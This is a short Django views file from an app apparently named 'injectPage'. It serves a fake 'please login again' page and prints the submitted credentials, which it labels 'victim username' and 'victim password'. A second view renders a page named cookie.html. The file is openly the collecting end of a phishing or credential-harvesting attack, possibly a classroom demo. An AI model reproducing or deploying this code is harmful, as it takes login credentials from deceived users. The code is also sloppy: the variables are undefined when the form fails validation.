from django.shortcuts import render
from injectPage.forms import loginForm

def loginPageDisplay(request):
	msg = "you are went go to outside page pls login again"
	if request.method == 'POST':
		form = loginForm.LoginForm(request.POST)
		if form.is_valid():
			username = form.cleaned_data.get('username')
			password = form.cleaned_data.get('password')
		
		print("victim username : " + str(username))
		print("victim password : " + str(password))
	else:
		form = loginForm.LoginForm()

	return render(request, 'loginPage.html', context={'form': form, 'msg': msg})

def cookiePageDisplay(request):
	return render(request, 'cookie.html')